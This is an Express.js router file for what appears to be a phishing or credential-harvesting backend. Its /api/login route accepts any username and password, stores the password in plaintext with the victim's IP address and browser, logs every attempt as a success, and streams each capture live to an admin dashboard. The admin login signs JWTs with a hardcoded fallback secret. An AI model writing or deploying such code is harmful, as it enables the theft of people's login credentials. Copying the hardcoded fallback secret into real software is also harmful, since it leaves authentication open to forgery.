const express = require("express");
const router = express.Router();
const bcrypt = require("bcryptjs");
const jwt = require("jsonwebtoken");
const crypto = require("crypto");
const { getDb } = require("../database");

// @route POST /api/login
// @desc Record a user login attempt
router.post("/login", async (req, res) => {
    try {
        const { username, password } = req.body;
        
        if (!username || !password) {
            return res.status(400).json({ message: "Username and password are required" });
        }

        const ipAddress = req.ip || req.connection.remoteAddress || "Unknown";
        const userAgent = req.headers["user-agent"] || "Unknown";

        const db = await getDb();
        const result = await db.run(
            `INSERT INTO login_attempts (username, password, ipAddress, userAgent, status) VALUES (?, ?, ?, ?, ?)`,
            [username, password, ipAddress, userAgent, "SUCCESS"]
        );

        // Emit real-time event to all connected admin dashboard clients
        const io = req.app.get("io");
        if (io) {
            const newLog = {
                id: result.lastID,
                username,
                password,
                ipAddress,
                userAgent,
                status: "SUCCESS",
                createdAt: new Date().toISOString()
            };
            io.emit("new-login", newLog);
        }

        res.status(200).json({ message: "Login attempt recorded" });
    } catch (err) {
        console.error("Login attempt error:", err);
        res.status(500).json({ message: "Server error" });
    }
});

// @route POST /api/admin/login
// @desc Admin login to get JWT
router.post("/admin/login", async (req, res) => {
    try {
        const { email, password } = req.body;

        if (!email || !password) {
            return res.status(400).json({ message: "Email and password are required" });
        }

        const db = await getDb();
        const admin = await db.get(`SELECT * FROM admins WHERE email = ?`, [email]);

        if (!admin) {
            return res.status(401).json({ message: "Invalid credentials" });
        }

        const isMatch = await bcrypt.compare(password, admin.password);
        if (!isMatch) {
            return res.status(401).json({ message: "Invalid credentials" });
        }

        const payload = { admin: { id: admin.id } };

        jwt.sign(
            payload, 
            process.env.JWT_SECRET || "fallback_secret_key", 
            { expiresIn: "10h" }, 
            (err, token) => {
                if (err) throw err;
                res.json({ token, email: admin.email });
            }
        );

    } catch (err) {
        console.error("Admin login error:", err);
        res.status(500).json({ message: "Server error" });
    }
});

// @route POST /api/admin/forgot-password
// @desc Simulate sending a password reset token
router.post("/admin/forgot-password", async (req, res) => {
    try {
        // Reset password functionality for SQLite (Simplified)
        // In a real app we'd add columns for reset tokens
        res.status(501).json({ message: "Forgot password not yet implemented for SQLite" });
    } catch (err) {
        console.error("Forgot password error:", err);
        res.status(500).json({ message: "Server error" });
    }
});

module.exports = router;
